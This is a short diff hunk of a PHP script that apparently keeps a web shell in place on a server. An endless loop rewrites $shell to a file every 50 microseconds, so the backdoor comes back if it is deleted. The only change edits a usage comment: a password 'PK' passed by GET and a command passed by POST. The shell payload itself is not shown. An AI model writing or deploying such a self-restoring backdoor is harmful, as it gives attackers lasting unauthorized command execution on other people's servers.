@@ -23,5 +23,6 @@ while (TRUE) {
 file_put_contents($file, $shell);
 usleep(50);
 }
-//pass=PK&cmd=
+//GET pass=PK
+//POST cmd=
 ?>
